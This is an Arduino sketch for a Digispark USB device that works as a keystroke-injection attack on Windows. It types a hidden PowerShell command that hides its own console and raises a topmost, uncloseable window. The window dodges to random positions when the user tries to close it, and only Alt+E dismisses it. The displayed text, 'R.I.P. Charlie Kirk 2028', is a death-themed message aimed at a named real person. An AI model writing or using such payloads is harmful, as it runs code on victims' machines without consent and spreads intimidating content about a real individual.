#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
  DigiKeyboard.delay(1800);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("powershell -NoP"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1300);

  digitalWrite(1, HIGH);

  // Oculta PowerShell + cartel indestructible hasta Alt+E
  DigiKeyboard.print(F("Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"Kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);';$console=[Console.Window]::GetConsoleWindow();[Console.Window]::ShowWindow($console,0);Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$f=New-Object Windows.Forms.Form;$f.Text='Aviso';$f.Size='480,300';$f.TopMost=$true;$f.StartPosition='CenterScreen';$f.FormBorderStyle='FixedDialog';$f.MaximizeBox=$false;$f.MinimizeBox=$false;$f.BackColor=[Drawing.Color]::FromArgb(20,20,30);$l=New-Object Windows.Forms.Label;$l.Font='Segoe UI,22,style=Bold';$l.ForeColor='White';$l.BackColor='Transparent';$l.TextAlign='MiddleCenter';$l.Dock='Fill';$l.Text=\"R.I.P.`n`nCharlie Kirk`n`n2028\";$f.Controls.Add($l);$script:ok=$false;$f.Add_FormClosing({param($s,$e);if(-not $script:ok){$e.Cancel=$true;$f.Left=(Get-Random -Minimum 40 -Maximum 1000);$f.Top=(Get-Random -Minimum 20 -Maximum 650)}});$f.KeyPreview=$true;$f.Add_KeyDown({if($_.Alt -and $_.KeyCode -eq 'E'){$script:ok=$true;$f.Close()}});[void]$f.ShowDialog()"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
